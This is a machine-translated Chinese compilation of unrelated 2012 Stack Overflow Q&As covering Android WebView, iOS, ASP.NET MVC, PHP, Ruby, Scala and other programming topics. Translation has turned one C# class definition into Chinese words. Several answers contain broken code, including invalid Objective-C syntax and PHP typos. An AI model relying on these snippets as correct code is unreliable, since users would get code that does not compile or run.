Qt 相当广泛地使用信号和槽，看看它们的描述：

[Qt 信号和槽](http://qt-project.org/doc/qt-4.8/signalsandslots.html)

# java - 如何将“...”省略号添加到 WebView 中的冗长文本？

> ID：10347080
> 
> 赞同：1
> 
> 时间：2012-04-27T08:10:41.823
> 
> 标签：java, android, html, css, android-layout

我正在使用 WebView 正确对齐 RTL 文本。

简单地说，当文本很长时，我想添加“...”省略号。

使用归档在 TextView 中`android:ellipsize="end"`

有没有办法实现“...”省略号或控制 WebView 中的行数？

这是代码：

```
String header = "<html><head><meta http-equiv=\"Content-Type\" +" + "content=\"text/html; charset=UTF-8\" /></head>";
String dt = "<body dir=\"rtl\">" +  o.get(p).getTitle() +"</body></html>";
webView.loadData(URLEncoder.encode(header + dt,"utf-8").replaceAll("\\+"," "), "text/html", "UTF-8"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:37:24.357

您有两个简单的选择：

1.  在您的 HTML 元素上使用 CSS 和 text-overflow 属性：[此处](http://www.quirksmode.org/css/textoverflow.html)的说明。

2.  如果您需要更好地控制省略号出现的位置并有方法 - 通过脚本标签在您的 HTML 中包含 jQuery 和 jQuery 省略号插件：[此处](http://tpgblog.com/2009/12/21/threedots-the-jquery-ellipsis-plugin/)的说明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:42:42.673

您可以解析 html 并找出页面上最后一个可见的 html 元素。然后，您可以通过将#ellipsis id 附加到该元素来使用以下内容。

CSS 文本换行：http: [//jsfiddle.net/6HcWM/](http://jsfiddle.net/6HcWM/)

问题将是找到最后一个可见的 html 元素，因为屏幕大小可能会有所不同，缩放级别也可能会有所不同。我猜您需要将 JavaScript 附加到 html 才能发现这一点...

也许这会起作用： [如何判断 DOM 元素在当前视口中是否可见？](https://stackoverflow.com/questions/123999/how-to-tell-if-a-dom-element-is-visible-in-the-current-viewport)

# windows-phone-7 - ManipulationDelta 事件仅在超过阈值后触发

> ID：10347084
> 
> 赞同：1
> 
> 时间：2012-04-27T08:10:56.563
> 
> 标签：windows-phone-7

我正在尝试编写一些允许用户在触摸屏上绘图的代码。

当使用 GestureService 或 ManipulationStarted/Delta 时，当用户开始移动手指时会出现“暂停” - 只有当手指距离开始点足够远时，您才会开始获取 ManipulationDelta 事件（例如我说过，GestureService 也是如此）。

我能做些什么来避免这个门槛？它确实不适用于绘图代码。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T08:56:18.787

刚刚写了博客，因为我在 AppHub 论坛上遇到了类似的问题。 [https://invokeit.wordpress.com/2012/04/27/high-performance-touch-interface-wpdev-wp7dev/](https://invokeit.wordpress.com/2012/04/27/high-performance-touch-interface-wpdev-wp7dev/)

Manipulation Delta 和 Gesture 服务是高级触摸界面。如果您想要性能，请考虑使用低级接口：Touch 和一个名为 TouchReported 的事件。我倾向于在我的许多项目中主要使用它们（用于绘图/位置检测）

您要插入到 detech touch 的事件是

```
Touch.FrameReported += Touch_FrameReported; 
```

您可以在 Loaded 事件中执行此操作。这是 Touch_FrameReported 处理程序的实现。WorkArea 在这方面是 Canvas。我也将它与 WritableBitmap 结合使用

```
private void Touch_FrameReported(object sender, TouchFrameEventArgs e)
{
    try
    {
        // Determine if finger / mouse is down
        point = e.GetPrimaryTouchPoint(this.workArea);

        if (point.Position.X < 0 || point.Position.Y < 0)
            return;

        if (point.Position.X > this.workArea.Width || point.Position.Y > this.workArea.Height)
            return;

        if (this.lbLetter.SelectedIndex == -1)
            return;

        switch (point.Action)
        {
            case TouchAction.Down:
                draw = true;
                old_point = point;
                goto default;

            case TouchAction.Up:
                draw = false;
                break;

            default:
                Draw();
                break;
        }
    }
    catch
    {
        MessageBox.Show("Application encountered error processing last request.");
    }
} 
```

这比高级接口好得多。

# geometry - 两个矩形之间的距离

> ID：10347085
> 
> 赞同：3
> 
> 时间：2012-04-27T08:10:57.733
> 
> 标签：geometry, distance, cgrect, cgpoint, cgsize

如何找到两个矩形之间的距离？相交的距离应返回 0。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-01T13:56:40.123

这是一个计算由 CGSize 表示的两个 CGRect 之间的距离的快速函数：

```
CGSize CGSizeDistanceBetweenRects(CGRect rect1, CGRect rect2)
{
    if (CGRectIntersectsRect(rect1, rect2))
    {
        return CGSizeMake(0, 0);
    }

    CGRect mostLeft = rect1.origin.x < rect2.origin.x ? rect1 : rect2;
    CGRect mostRight = rect2.origin.x < rect1.origin.x ? rect1 : rect2;

    CGFloat xDifference = mostLeft.origin.x == mostRight.origin.x ? 0 : mostRight.origin.x - (mostLeft.origin.x + mostLeft.size.width);
    xDifference = MAX(0, xDifference);

    CGRect upper = rect1.origin.y < rect2.origin.y ? rect1 : rect2;
    CGRect lower = rect2.origin.y < rect1.origin.y ? rect1 : rect2;

    CGFloat yDifference = upper.origin.y == lower.origin.y ? 0 : lower.origin.y - (upper.origin.y + upper.size.height);
    yDifference = MAX(0, yDifference);

    return CGSizeMake(xDifference, yDifference);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-05-14T12:17:42.267

在一个稍微相关的注释中，这里是如何计算两个给定 CGRects的***中心之间的距离：***

```
CGFloat CGRectGetDistanceBetweenCenters( CGRect rect1, CGRect rect2 )
{
   CGPoint center1 = CGPointMake( CGRectGetMidX( rect1 ), CGRectGetMidY( rect1 ) );
   CGPoint center2 = CGPointMake( CGRectGetMidX( rect2 ), CGRectGetMidY( rect2 ) );

   CGFloat horizontalDistance = ( center2.x - center1.x );
   CGFloat verticalDistance = ( center2.y - center1.y );

   CGFloat distance = sqrt( ( horizontalDistance * horizontalDistance ) + ( verticalDistance * verticalDistance ) );

   return distance;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-06-11T17:10:40.917

将快速版本添加到批准的答案中：

```
extension CGRect {

    func distance(from rect: CGRect) -> CGSize {
        if intersects(rect) {
            return CGSize(width: 0, height: 0)
        }

        let mostLeft = origin.x < rect.origin.x ? self : rect
        let mostRight = rect.origin.x < self.origin.x ? self : rect

        var xDifference = mostLeft.origin.x == mostRight.origin.x ? 0 : mostRight.origin.x - (mostLeft.origin.x + mostLeft.size.width)
        xDifference = CGFloat(max(0, xDifference))

        let upper = self.origin.y < rect.origin.y ? self : rect
        let lower = rect.origin.y < self.origin.y ? self : rect

        var yDifference = upper.origin.y == lower.origin.y ? 0 : lower.origin.y - (upper.origin.y + upper.size.height)
        yDifference = CGFloat(max(0, yDifference))

        return CGSize(width: xDifference, height: yDifference)
    }
} 
```

# html - 使用 SWFLoader 设置电影大小的问题

> ID：10347086
> 
> 赞同：0
> 
> 时间：2012-04-27T08:11:02.150
> 
> 标签：html, actionscript-3, flash, apache-flex, flex3

我有以下问题：

当我通过 HTML 标签嵌入 swf 电影时，该电影具有给定的尺寸。不幸的是，使用 SWFLoader（设置高度和宽度）执行此操作不起作用。这部电影似乎有全屏尺寸。

编辑：

这是 SWFLoader 的代码（它被缩放到 240x320，但加载的电影要大得多，并没有填满整个窗口）：

```
<mx:SWFLoader  id="video" autoLoad="true" height="240" width="320" scaleContent="true" maintainAspectRatio="true" source="http://movie_address" /> 
```

这是标签的工作代码：

```
<object width="320" height="240" ><param name="allowfullscreen" value="true" /><param name="movie" value="http://movie_address" /><embed src="http://movie_address" type="application/x-shockwave-flash" allowfullscreen="true" width="320" height="240"></embed></object> 
```

我该如何解决这个问题？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:56:02.120

尝试使用 scaleContent="true";

```
<s:SWFLoader id="loader1" source="@Embed(source='sample.swf')" x="100" y="100" 
                 width="200" height="200" scaleContent="true"/> 
```

# asp.net-mvc - ASP.NET MVC（四）——按一定顺序绑定属性

> ID：10347087
> 
> 赞同：5
> 
> 时间：2012-04-27T08:11:04.270
> 
> 标签：asp.net-mvc, asp.net-mvc-3, asp.net-mvc-2, asp.net-mvc-4

有没有办法在 C 之前强制绑定属性 A 和 B？

System.ComponentModel.DataAnnotations.DisplayAttribute 类中有 Order 属性，但是它会影响绑定顺序吗？

我想要实现的是

```
page.Path = page.Parent.Path + "/" + page.Slug 
```

在自定义 ModelBinder

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T16:09:13.733

为什么不将 Page 属性实现为：

```
public string Path{
    get { return string.Format("{0}/{1}", Parent.Path, Slug); }
} 
```

?

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-29T14:00:48.903

我最初会推荐 Sams 的答案，因为它根本不涉及 Path 属性的任何绑定。您提到您可以使用 Path 属性连接值，因为这会导致发生延迟加载。因此，我想您正在使用域模型向视图显示信息。因此，我建议使用视图模型仅显示视图中所需的信息（然后使用 Sams 答案检索路径），然后使用工具（即[AutoMapper](https://github.com/AutoMapper/AutoMapper)）将视图模型映射到域模型。

但是，如果您继续在视图中使用现有模型并且无法使用模型中的其他值，则可以在其他绑定发生后将 path 属性设置为自定义模型绑定器中的表单值提供程序提供的值（假设不对 path 属性执行验证）。

因此，假设您有以下视图：

```
@using (Html.BeginForm())
{
    <p>Parent Path: @Html.EditorFor(m => m.ParentPath)</p>
    <p>Slug: @Html.EditorFor(m => m.Slug)</p>
    <input type="submit" value="submit" />
} 
```

以及以下视图模型（或视情况而定的域模型）：

公共类 IndexViewModel { 公共字符串 ParentPath { 获取；放; } 公共字符串蛞蝓 { 得到；放; } 公共字符串路径 { 获取；放; } }

然后，您可以指定以下模型绑定器：

```
public class IndexViewModelBinder : DefaultModelBinder
    {
        protected override void OnModelUpdated(ControllerContext controllerContext, ModelBindingContext bindingContext)
        {
            //Note: Model binding of the other values will have already occurred when this method is called.

            string parentPath = bindingContext.ValueProvider.GetValue("ParentPath").AttemptedValue;
            string slug = bindingContext.ValueProvider.GetValue("Slug").AttemptedValue;

            if (!string.IsNullOrEmpty(parentPath) && !string.IsNullOrEmpty(slug))
            {
                IndexViewModel model = (IndexViewModel)bindingContext.Model;
                model.Path = bindingContext.ValueProvider.GetValue("ParentPath").AttemptedValue + "/" + bindingContext.ValueProvider.GetValue("Slug").AttemptedValue;
            }
        }
    } 
```

最后通过在视图模型上使用以下属性来指定要使用此模型绑定器：

```
[ModelBinder(typeof(IndexViewModelBinder))] 
```

# iphone - 由于无法重现的崩溃，Apple 拒绝了应用程序

> ID：10347091
> 
> 赞同：0
> 
> 时间：2012-04-27T08:11:24.267
> 
> 标签：iphone, nsdata, unrecognized-selector

苹果提供了崩溃日志，解释了遇到的异常和原因如下：

> 异常类型：EXC_CRASH (SIGABRT) 异常代码：0x00000000、0x00000000 崩溃线程：0 应用程序特定信息： ***由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[__NSCFData dataUsingEncoding:]：无法识别的选择器发送到实例 0x1b4c20”

以下是在符号化崩溃日志后突出显示为崩溃原因的代码行

```
NSXMLParser *moveParser = [[NSXMLParser alloc] initWithData:[str_response dataUsingEncoding:NSUTF8StringEncoding]]; 
```

和

```
[[UAirship shared] registerDeviceToken:[deviceToken dataUsingEncoding:NSUTF8StringEncoding] withAlias:myAlias]; 
```

Apple 已经在 iOS 5.1 版 iPhone 4 和 iPad 3G 上审查了这个应用程序，每次都发生崩溃。而我们无法在任何平台上重现崩溃。我们已经尝试在 iPhone4、iOS 5.1 的 iPhone 3GS、iOS 5.0 的 iPhone 3GS、iOS 4.3.2 的 iPhone 3GS 上进行调试，但没有产生崩溃。

谁能让我知道我使用的代码有什么问题？

这是编写这些行的代码块。

```
NSString *str_response=(NSString *)[dic objectForKey:SuccessKey];
NSXMLParser *moveParser = [[NSXMLParser alloc] initWithData:[str_response dataUsingEncoding:NSUTF8StringEncoding]];
moveParser.delegate = self;
[moveParser parse];
[moveParser release]; 
```

和

```
NSString *deviceToken=[[NSUserDefaults standardUserDefaults] objectForKey:@"devToken"];
[[UAirship shared] registerDeviceToken:[deviceToken dataUsingEncoding:NSUTF8StringEncoding] withAlias:myAlias]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:24:21.550

它可能与`plist`（用户默认容器）有关。如果in未设置（空或不存在的 plist 文件） ，您尝试注册一个`deviceToken`可能。尝试删除 Preferences 文件夹中的所有 plist，您可能会重现崩溃。`NIL``devToken``standardUserDefaults`

要解决问题，您应该检查 if `deviceToken`is `NIL`。如果不是：`registerDeviceToken`，否则创建空令牌等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:28:39.397

我认为，这是一个明显的内存泄漏问题@** deviceToken**。同意@septi 的描述。

在明确提到的异常中，'NSInvalidArgumentException'，原因：'-[__NSCFData dataUsingEncoding:]：发送了无法识别的选择器并且 deviceToken 可能正在存储空值，这会产生问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:30:14.637

由于自动释放，您的字符串可能`str_response`不在内存中

```
NSString *str_response= ([dic objectForKey:SuccessKey] : [[NSString alloc] initWithFormat:@"%@",[dic objectForKey:SuccessKey]] autorelease]  ?  "" );

NSXMLParser *moveParser = [[NSXMLParser alloc] initWithData:[str_response dataUsingEncoding:NSUTF8StringEncoding]];

moveParser.delegate = self;

BOOL isParsed = [moveParser parse];

if (isParsed) {

}else {

    // Parsing fail

}

[moveParser release]; 
```

# php - 为 ajax 修整 php echo

> ID：10347092
> 
> 赞同：-1
> 
> 时间：2012-04-27T08:11:27.183
> 
> 标签：php, ajax

我遇到的问题是一个简单的 ajax 邮件脚本。

我让它像这样工作正常：

php片段：

```
if(mail($to,$subject,$message,$headers)){
echo "success";
} 
```

回到这里处理的ajax代码：

```
 if($.trim(data) == "success"){
           // do the success stuff
         }else{
           // doo the fail stuff
         } 
```

我担心的是，所有版本的资源管理器都不支持在 jquery 代码中“修剪”。所以我宁愿让php返回已经修剪过的字符串“success”。但是将内容更改为您在下面看到的内容并没有像我预期的那样工作，并且在 ajax 中运行失败函数..？

修改后的 php ：

```
if(mail($to,$subject,$message,$headers)){
$success = trim("success");
echo $success;
} 
```

修正的阿贾克斯：

```
 if(data == "success"){
         // do success stuff does not happen anymore
     }else{
         // now it always does fail stuff, so comparison is always false
     } 
```

为什么在 php 中进行修整而不是让我失望的 ajax..？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:17:35.497

试试这个......在ajax中

```
$('#err_register').html("Data:"+data+"Display");
var resultData=jQuery.trim(data);

if(resultData == "success"){
         // do success stuff does not happen anymore
}else{
         // now it always does fail stuff, so comparison is always false
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:16:32.157

您的问题不在于字符串“成功”。修剪只是从字符串的开头和结尾删除空格和白色字符（换行符等）。而在“成功”中没有这样的事情，所以它什么也不做。*但是，如果JavaScript 端的*修剪有效，那么您的 PHP 必须生成一些空白字符，因此它会出现在响应中。但这不在您发布的代码中，工作“成功”没有问题。您必须仔细阅读您的代码并找到换行符/空格/白色字符的来源。

通常，问题在于 Unicode BOM 标记（查找并在编辑器中打开您的 PHP 文件，以显示它们是否存在）或 PHP 文件末尾的换行符（删除这些）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:16:52.623

如果您使用 jquery.ajax，您可以指定成功/完成/失败回调函数。您的 jquery 调用可能是一个执行邮件函数然后返回 true 或 false 的函数。然后，您可以在成功函数中检查返回。

[在这里查看](http://api.jquery.com/jQuery.ajax/)

# asp.net-mvc-3 - 将字符串数组绑定到 MVC Razor 中的 DropDownList

> ID：10347094
> 
> 赞同：7
> 
> 时间：2012-04-27T08:11:44.547
> 
> 标签：asp.net-mvc-3, razor, model-binding, html.dropdownlistfor

你知道我可以很容易地将字符串数组的内容绑定到 MVC Razor 视图中的 DropDownList 吗？

```
public static string[] AgeRagne = new string[] { "Sun", "Mon", "Tues", "Wed" }; 
```

更新：下面的代码有效。

```
 @Html.DropDownListFor(
    model => model.Filter.AgeRange,
    new SelectList(Extensions.AgeRange, Model.Filter.AgeRange),
    new { @class = "search-dropdown", name = "ageRange" }
  ) 
```

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-04-27T08:35:39.153

使用您的数组创建一个`SelectList`并将其传递给您的视图：

```
SelectList list = new SelectList(AgeRagne);
ViewBag.myList = list; 
```

然后在您看来，使用`Html.DropDownlist`：

```
@Html.DropDownList("myList", ViewBag.myList as SelectList) 
```

就这样

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-27T08:28:28.153

一个不是很好但快速的方法是这样做:)：

```
<select name="dowList" id="dowList">
    @{string[] AgeRagne = new string[] { "Sun", "Mon", "Tues", "Wed" };}
    @foreach (var dow in AgeRagne)
    {
        <option value="@dow">@dow</option>
    }
</select> 
```

一个 htmlhelper 将是最好的长期稳定的解决方案。

# php - 计算一周中两天之间的日期

> ID：10347100
> 
> 赞同：-1
> 
> 时间：2012-04-27T08:12:07.360
> 
> 标签：php

我需要一种算法来计算一周中两天之间的日期！例如我有

开始日期：23-04-2012 和结束日期：27-04-2012

现在我想收到一个具有这种结构的数组：

```
$arr = array(
  '23-04-2012',
  '24-04-2012',
  '25-04-2012',
  '26-04-2012', 
  '27-04-2012', 
  '28-04-2012'
); 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:19:07.423

您可以使用 DateTime::Diff 函数（[此处](http://www.php.net/manual/en/datetime.diff.php)的文档）。

1.  将您的两个日期传递给函数。
2.  获取作为天数的返回值。
3.  向其中添加一个（以便包括开始日期和结束日期）。
4.  组成一个`for(int i = 0; i <= $days_difference; i++)`循环。
5.  每次[将日期增加一天并将其添加到数组中。](http://www.php.net/manual/en/datetime.add.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:46:30.023

```
$start = '23-04-2012';
$end   = '27-04-2012';

$startTs = strtotime("$start 00:00:00");
$endTs   = strtotime("$end 00:00:00");

$days = array();
$day  = $startTs;

$i = 0;

while ($day <= $endTs) {
    $days[] = date('d-m-Y', $day);
    $i++;
    $day = mktime(0, 0, 0, date('n', $startTs), date('j', $startTs) + $i, date('Y', $startTs));
}

var_dump($days); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-27T08:18:42.610

这可以帮助你。

```
$startdate=explode("-","23-04-2012");
$enddate=explode("-","27-04-2012");
$i;
$arr=array();
for($i=$startdate[0];$i<=$endate[0];$i++)
{
     $dd=$i.'-'.$startdate[1].'-'.$startdate[2];
     array_push($arr,$dd);
}
print_r($arr); 
```

# java - XML SAX 解析器丢失数据

> ID：10347107
> 
> 赞同：1
> 
> 时间：2012-04-27T08:12:45.517
> 
> 标签：java, xml, sax, saxparser

我正在用 SAX 解析下一种 XML：

```
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
<ROOT>
    <MESSAGES>
        <MESSAGE>
            <SUBJECT><![CDATA[Some text]]></SUBJECT>
            <BODY><![CDATA[Some text Some Text ]]></BODY>
            <RECIPIENTS>
                <TO><![CDATA[mail1@domain.com]]></TO>
                <TO><![CDATA[mail2@domain2.com]]></TO>
            </RECIPIENTS>
        </MESSAGE>
        <MESSAGE>
            <SUBJECT><![CDATA[Some text]]></SUBJECT>
            <BODY><![CDATA[Some text1 Some Text2 ]]></BODY>
            <RECIPIENTS>
                <TO><![CDATA[mail1@domain.com]]></TO>
                <TO><![CDATA[mail2@domain2.com]]></TO>
            </RECIPIENTS>
        </MESSAGE>

           <!-- List of 50 MESSAGE ITEM-->
    </MESSAGES>

</ROOT> 
```

当方法字符被调用时，

```
public void characters(char buf[], int offset, int len) throws SAXException
    {
     String currentValue = new String(buf, offset, len);
     System.out.println(currentValue);
    } 
```

在某些消息项目中，您收到不正确的值，例如，当我解析标签 BODY 时，我得到**'1 Some Text2'**当我必须收到**'Some text1 Some Text2'**并且我找不到丢失的数据甚至打印控制台以这种方法接收的所有数据。

在消息 47 处，总是在相同位置剪切数据（在其他消息中，总是在相同位置）。我认为这个问题可能是因为角色在一瞬间调用了两次或更多，但我刚才说过，我看不到丢失的数据，甚至都打印到控制台。

你能帮我吗？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T10:08:44.727

请注意，字符并不能保证一次性返回所有文本。在 BODY 中的文本之后，你不能保证你有所有的文本，直到你收到结尾 /BODY，即它可以调用字符一次，或者多次。你需要添加你聚集在一起的文本，直到你到达最后，比如在一个 stringBuilder 中：

```
StringBulder xmlText = new StringBuilder();

 public void characters(char buf[], int offset, int len) throws SAXException
 {
    xmlText.append(buf, offset, len);

}

public void endElement(String uri, String localName, String qname) throws SAXException 
{
    System.out.println(xmlText.toString());
    xmlText = new StringBuilder();
} 
```

# xamarin.ios - 在 Monotouch 上使用 TeeCharts 时无法关闭缩放

> ID：10347119
> 
> 赞同：0
> 
> 时间：2012-04-27T08:13:54.540
> 
> 标签：xamarin.ios, teechart

我在 Monotouch 上使用 TeeCharts，只有在我使用时才能关闭缩放：

```
chart.Aspect.ZoomScrollStyle = Steema.TeeChart.Drawing.Aspect.ZoomScrollStyles.Manual; 
```

但是，如果我使用手动选项，我在设备上使用它时会出现渲染问题。如果我只是在切换`ZoomScrollStyle`到自动并使用时尝试关闭缩放：

```
chart.Chart.Zoom.Allow = false; 
```

没发生什么事。

**更新：**我发现如果 View3D 开启一切正常，但是当我在 2D 环境中工作时，缩放选项始终处于打开状态。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-30T07:36:39.693

如您所见，有一些不同的 ZoomScrollStyles 和 ZoomStyles 选项。这些选项在“教程 8 - TeeChart NET for iOS Applications”、“API 更改特定于 TeeChart .NET for iOS”部分中进行了说明。并且还在“教程 10- 缩放和滚动”中。

默认情况下设置自动缩放滚动样式。此样式使用 iOS 标准技术进行缩放和滚动，但并非所有系列类型都支持，并且仅在 2D 模式下。

Manual ZoomScrollStyle 通过重绘图表来进行缩放，因此速度较慢（我们将尝试在未来的版本中改进此功能）。

拖动功能适用于 ZoomScrollStyles，也适用于 2D 和 3D。

斯蒂玛支持。

# ruby - Ruby - 数组乘法或 JOIN 操作

> ID：10347120
> 
> 赞同：3
> 
> 时间：2012-04-27T08:14:09.467
> 
> 标签：ruby, arrays, set

我有两个数组，

```
a = [1, 2]
b = [:a] 
```

我想得到结果

```
[[1, :a], [2, :a]] 
```

有什么方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T08:28:13.320

使用[Array#product](http://www.ruby-doc.org/core-1.9.3/Array.html#method-i-product)：

```
a = [1, 2]
b = [:a]
a.product(b)
=> [[1, :a], [2, :a]] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:29:42.697

你也可以这样做

```
[a,b*a.size].transpose
#=> [[1, :a], [2, :a]] 
```

# html - 如何在其他窗口中打开任何链接

> ID：10347121
> 
> 赞同：-1
> 
> 时间：2012-04-27T08:14:15.980
> 
> 标签：html

以下代码行打开同一页面，如何使其在其他新窗口中打开？

```
string str="<td><a href='#' onclick='GoToFunction()'>" + dataTable.Rows[i][j] + "</a></td>" 
```

请回复...我不知道为什么没有显示 html 标签

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:16:11.520

因为您正在运行一个 javascript 函数，所以`onclick`您需要使用 javascript 打开一个新窗口。简单地添加`target="_blank"`到标准`a`元素是行不通的。尝试这个：

```
function GoToOrchestra() {
    // your code...

    var win = window.open("http://myurl.com", "newWindow");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:19:46.260

在`<a>`标签上，只需添加[一个目标](http://www.w3schools.com/tags/att_a_target.asp)集为“_blank”。

例如：

```
<a href="http://www.stackoverflow.com" target="_blank">My Link</a> 
```

# ruby-on-rails - Railscast 不推荐生产解决方案，我正在寻找原因

> ID：10347123
> 
> 赞同：0
> 
> 时间：2012-04-27T08:14:21.627
> 
> 标签：ruby-on-rails, ruby-on-rails-3, jquery, railscasts

在这个[railscast 中，](http://railscasts.com/episodes/240-search-sort-paginate-with-ajax?view=asciicast)我们的好朋友 Bates 先生介绍了一个解决方案来创建一个可以对一组数据进行搜索、排序和分页的应用程序。在进行 AJAX 搜索时，他提供了一个解决方案，该解决方案将在用户在搜索框中输入输入时显示搜索结果。这是他的解决方案：

```
$('#products_search input').keyup(function () {
  $.get($('#products_search').attr('action'), &crarr; 
    $('#products_search').serialize(), null, 'script');
  return false;
}); 
```

但是他说“请注意，这只是一个快速演示，并不是最好的方法。如果您在生产应用程序中执行类似的操作，可以使用几个 jQuery 插件。” 我正在寻找他为什么认为这不适合生产的解释。提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:17:19.293

我看到这个解决方案有两个主要问题。第一个是每次按下键时都会发出 HTTP (AJAX) 请求，这不是最有效的方法。第二个是您基本上`eval`是在响应中调用，这`eval`是不好的，因为它可能导致恶意用户执行您不想执行的代码。

一些改进建议：

*   使用适当的 JSON 解析器并将数据作为 JSON 传回。（你可以使用[$.getJSON](http://api.jquery.com/jQuery.getJSON/)）
*   限制请求 - 不要在每个 keyUp 上都这样做，可能会启动一个计时器，并且仅在最后一秒没有按下任何键时才提交请求，这意味着它不会为快速打字的人打很多电话。
*   缓存响应。如果您已经搜索过某些东西，那么两次获取数据是没有意义的。记下（在 JS 对象中）本次会话中的先前调用及其结果。

# php - php 检查是否至少选中了两个复选框并向用户显示一条消息

> ID：10347125
> 
> 赞同：1
> 
> 时间：2012-04-27T08:14:28.047
> 
> 标签：php

```
<div class='container'><label for='vehicle'>Vehicle:</label><br/>
 <span id='contactus_vehicle_errorloc' class='error'></span>
<input type="checkbox" name="vehicle" id="bike" value=<?php echo $formproc->SafeDisplay('bike') ?> /> I have a bike<br />
<input type="checkbox" name="vehicle" id="car" value=<?php echo $formproc->SafeDisplay('car') ?> /> I have a car <br />
<input type="checkbox" name="vehicle" id="motorbike" value=<?php echo $formproc->SafeDisplay('motorbike') ?> /> I have a motorbike <br/>
<input type="checkbox" name="vehicle" id="plane" value=<?php echo $formproc->SafeDisplay('plane') ?> /> I have a plane <br/>
<input type="checkbox" name="vehicle" id="papaki" value=<?php echo $formproc->SafeDisplay('papaki') ?> /> I have a papaki <br/>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:19:05.897

这很简单 - 将所有值相加，如果它至少是两个，那么你就可以了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:43:25.783

嗨，要计算选中复选框的数量。

1.  替换`name="vehicle"`为`name="vehicle[]"`. 通过车辆后值的这种变化，将出现一组检查值。

然后在php文件中

```
if(isset($_POST['vehicle'])){
     /*check atleast 2 checked*/  
     if(sizeof($_POST['vehicle']) > 1){
       //code comes here
    }
  } 
```

谢谢

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:20:13.287

PHP 不知道 ID，它只知道名称。将名称更改为：

```
<input type="checkbox" name="vehicle[]" ///> 
```

然后你可以像这样签入PHP：

```
<?php
if (count($_POST['vehicle]') >= 2) {
  //do something
}
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T08:20:25.173

像这样更改名称 name="vehicle[]" 然后在您的页面中

```
if (count($vehicle) < 2){
 echo "please select at least two fields";
} 
```

# javascript - (jquery) 圆形按钮设置？

> ID：10347127
> 
> 赞同：0
> 
> 时间：2012-04-27T08:14:39.580
> 
> 标签：javascript, jquery, html, css

我可以从 jqueryUI 获得圆形按钮集（在单选按钮中使用）吗？

正如我从 jqueryUI 得到的，它的形状是矩形/正方形。

例如 id 我有 4 个单选按钮 abcd 我希望每个收音机都有圆形

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:11:33.687

我认为作者正在谈论生成方法的[按钮/收音机。](http://jqueryui.com/demos/button/#radio)`buttonset()`这很有趣，但我认为使用 jQueryUI 生成单选按钮的最佳选择是为它们添加一个新的 CSS 样式，类似于：

```
.rounded-corners {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
} 
```

如果这能帮助你解决不小的问题，我会很高兴:)

# scala - 为 maven-poms 设计 Scala DSL

> ID：10347131
> 
> 赞同：2
> 
> 时间：2012-04-27T08:14:54.550
> 
> 标签：scala, maven, dsl

我正在考虑一个 DSL / 域设计来分析一大堆 Maven 依赖项。

输入是一个 poms 列表（实际上是 poms 和物理位置之间的映射），我认为它将被解析为“平面”（即非递归）文件，以一些不错的 scala 类型，如下所示：

```
class Artifact(
  val groupId : String, 
  val artifactId : String, 
  val version : String
)

class Module(
  val id : Artifact,
  val location : URI, // any good type for this ?
  val parent : Option(Artifact),
  val modules : List(Artifact),
  val dependencies : List(Artifact)
) 
```

然后在那个“节点”上有三个结构

1.  继承：由 <parent> 和 <modules>
2.  依赖项：通过 <依赖项>
3.  物理：文件系统/svn dir-layout

**问题：这些应该如何设计？**

我心中的一些可能性：

1.  将结构强加于模块本身，例如通过使依赖项列表可变，并将其类型更改为 List(Either(Artifact,Module))。
2.  复用集合 API，将继承树映射到 Tree(Module)。但是依赖*图*呢？
3.  设计全新的结构并将 pom 列表映射到此
4.  *其他的？*...

当然，我希望数据结构中包含尽可能多的信息，以避免重复计算。大纲是：

1.  解析平面文件列表
2.  丰富结构（通过结构更新（可变）或映射到不同的结构（不可变/功能）。
3.  查询丰富的结构。

我想做的事情：

*   查找传入的依赖项
*   找到“集群”
*   查找第 n 级的关系
*   给出重构提示（上拉依赖，合并模块）
*   将 pom.xml 渲染为 html，浏览到相关的工件。（类似于[http://jarvana.com](http://jarvana.com)）

感谢您的任何见解...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T08:00:05.137

